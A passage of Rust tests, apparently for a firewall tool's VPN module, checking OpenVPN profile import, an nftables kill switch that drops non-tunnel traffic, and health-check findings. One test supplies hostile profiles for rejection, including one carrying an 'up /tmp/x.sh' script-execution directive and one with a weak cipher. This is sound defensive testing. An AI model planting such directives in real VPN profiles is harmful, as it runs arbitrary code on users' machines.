                    Some(content.clone())
                }
                _ => None,
            })
            .unwrap();
        assert!(
            keyfile.contains("type=vpn")
                && keyfile.contains("remote=10.99.0.2:1194:udp")
                && keyfile.contains("autoconnect=false")
        );
        assert!(
            !keyfile.contains("PRIVATE KEY"),
            "the keyfile holds paths, not keys"
        );
        assert!(matches!(ops.last(), Some(Op::Exec { path, .. }) if path == "/usr/bin/nmcli"));
        // The record is what the kill switch reads: the server, no secret.
        let record = ops
            .iter()
            .find_map(|o| match o {
                Op::FileWrite { path, content, .. } if path.ends_with("lab.json") => {
                    Some(content.clone())
                }
                _ => None,
            })
            .unwrap();
        assert!(
            record.contains("10.99.0.2:1194")
                && record.contains("openvpn")
                && !record.contains("BEGIN")
        );
        std::fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn openvpn_needs_the_networkmanager_plugin_and_refuses_hostile_profiles() {
        let (root, sandbox) = tree(&NM);
        let error = plan(
            &sandbox,
            &cfg(json!({ "action": "import", "name": "lab", "profile": ovpn() })),
        )
        .unwrap_err();
        assert!(error.to_string().contains("OpenVPN plugin"), "{error}");
        let (root2, with_plugin) = tree(&[NM[0], NM[1], OVPN_PLUGIN]);
        for bad in [
            ovpn().replace("client\n", "client\nup /tmp/x.sh\n"),
            ovpn().replace("cipher AES-256-GCM", "cipher BF-CBC"),
            "just some text".to_string(),
        ] {
            assert!(
                plan(
                    &with_plugin,
                    &cfg(json!({ "action": "import", "name": "lab", "profile": bad }))
                )
                .is_err()
            );
        }
        // A server by name cannot be allowed by the kill switch; by address it can.
        let named = ovpn().replace("10.99.0.2", "vpn.example.net");
        let ops = plan(
            &with_plugin,
            &cfg(json!({ "action": "import", "name": "lab", "profile": named })),
        )
        .unwrap();
        assert!(ops.len() > 3);
        for r in [root, root2] {
            std::fs::remove_dir_all(r).unwrap();
        }
    }

    fn chain_of(ops: &[Op]) -> Chain {
        let Op::NftFragment { fragment } = &ops[1] else {
            panic!()
        };
        serde_json::from_value::<Fragment>(fragment.clone())
            .unwrap()
            .chains
            .remove(0)
    }

    #[test]
    fn the_kill_switch_lets_the_tunnel_and_its_server_through_and_drops_the_rest() {
        let (root, sandbox) = tree(&[
            ("/usr/lib/systemd/system/NetworkManager.service", ""),
            ("/usr/bin/nmcli", ""),
            (
                "/etc/ibexwall/vpn/profiles/lab.json",
                r#"{"endpoints":["10.99.0.2:51820"],"dns":false}"#,
            ),
        ]);
        let ops = plan(
            &sandbox,
            &cfg(json!({ "action": "killswitch", "allow": "10.0.2.2" })),
        )
        .unwrap();
        let chain = chain_of(&ops);
        assert_eq!(chain.name, "net_vpn_out");
        assert_eq!(chain.hook, Hook::Output);
        assert!(chain.rules[0].oif_loopback);
        let prefixes: Vec<_> = chain
            .rules
            .iter()
            .filter_map(|r| r.oif_prefix.clone())
            .collect();
        assert_eq!(prefixes, ["wg", "tun"]);
        let server = chain
            .rules
            .iter()
            .find(|r| r.daddr == ["10.99.0.2"])
            .unwrap();
        assert_eq!(
            (server.dports.clone(), server.protocols.len()),
            (vec![51820], 2)
        );
        assert!(chain.rules.iter().any(|r| r.dports == [67, 547]));
        assert!(chain.rules.iter().any(|r| r.daddr == ["10.0.2.2"]));
        assert_eq!(chain.rules.last().unwrap().verdict, Verdict::Drop);
        // Nothing before the drop accepts "everything".
        assert!(
            chain.rules[..chain.rules.len() - 1]
                .iter()
                .all(|r| r.oif_loopback
                    || r.oif_prefix.is_some()
                    || !r.daddr.is_empty()
                    || !r.dports.is_empty())
        );
        std::fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn the_kill_switch_refuses_names_and_an_unknown_server() {
        let (root, sandbox) = tree(&NM);
        assert!(plan(&sandbox, &cfg(json!({ "action": "killswitch" }))).is_err());
        let error = plan(
            &sandbox,
            &cfg(json!({ "action": "killswitch", "endpoints": "vpn.example.com:51820" })),
        )
        .unwrap_err();
        assert!(error.to_string().contains("name"));
        assert!(
            plan(
                &sandbox,
                &cfg(json!({ "action": "killswitch", "endpoints": "10.1.1.1:0" }))
            )
            .is_err()
        );
        assert!(
            plan(
                &sandbox,
                &cfg(json!({ "action": "killswitch", "endpoints": "[2001:db8::1]:51820" }))
            )
            .is_ok()
        );
        assert!(
            plan(
                &sandbox,
                &cfg(
                    json!({ "action": "killswitch", "endpoints": "10.1.1.1:443", "allow": "nope" })
                )
            )
            .is_err()
        );
        std::fs::remove_dir_all(root).unwrap();
    }

    fn ids(report: &CheckReport) -> Vec<&str> {
        report.findings.iter().map(|f| f.id.as_str()).collect()
    }

    #[test]
    fn the_check_names_a_vpn_without_a_kill_switch_and_the_dns_conflict() {
        let (root, sandbox) = tree(&[("/etc/ibexwall/vpn/profiles/lab.json", r#"{"dns":true}"#)]);
        assert_eq!(ids(&evaluate(&sandbox, &[], "now")), ["vpn.no_killswitch"]);
        let (root2, with_dns) = tree(&[
            ("/etc/ibexwall/vpn/profiles/lab.json", r#"{"dns":true}"#),
            ("/etc/ibexwall/dns/config.toml", "x"),
        ]);
        assert!(ids(&evaluate(&with_dns, &[], "now")).contains(&"vpn.dns_conflict"));
        let (root3, none) = tree(&[]);
        let quiet = evaluate(&none, &[], "now");
        assert!(quiet.findings.is_empty());
        assert!(
            quiet
                .results
                .iter()
                .all(|r| r.outcome == CheckOutcome::NotApplicable)
        );
        for r in [root, root2, root3] {
            std::fs::remove_dir_all(r).unwrap();
        }
    }

    #[test]
    fn a_protected_vpn_passes_and_a_dropped_tunnel_is_explained() {
        let files = [
            ("/etc/ibexwall/vpn/profiles/lab.json", r#"{"dns":false}"#),
            ("/etc/ibexwall/vpn/killswitch.json", "{}"),
        ];
        let (root, sandbox) = tree(&files);
        let up = evaluate(&sandbox, &["wireguard".to_string()], "now");
        assert!(up.findings.is_empty());
        assert_eq!(up.results[0].outcome, CheckOutcome::Pass);
        let down = evaluate(&sandbox, &["802-3-ethernet".to_string()], "now");
        assert_eq!(ids(&down), ["vpn.blocked"]);
        assert_eq!(down.findings[0].severity, Severity::Info);
        std::fs::remove_dir_all(root).unwrap();
    }
}
